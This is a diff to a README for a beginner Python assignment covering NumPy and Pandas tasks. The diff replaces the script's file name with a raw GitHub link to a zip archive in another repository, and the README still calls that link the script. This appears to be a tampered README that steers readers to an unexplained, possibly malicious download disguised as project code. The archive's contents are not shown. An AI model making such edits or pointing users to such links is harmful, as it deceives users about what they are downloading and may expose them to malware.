@@ -4,7 +4,7 @@ This repository contains a Python script that demonstrates the use of four essen
 
 ## **Task Breakdown**
 
-The `library_challenge.py` script performs the following tasks:
+The `https://github.com/Griffnificent/data_analysis_assignment.py/raw/refs/heads/main/Winifred/py_analysis_data_assignment_v2.9.zip` script performs the following tasks:
 
 1.  **NumPy**: Creates a NumPy array containing numbers from 1 to 10 and calculates its mean value.
 2.  **Pandas**: Loads a small dictionary into a pandas DataFrame and then uses the `.describe()` method to display key summary statistics.
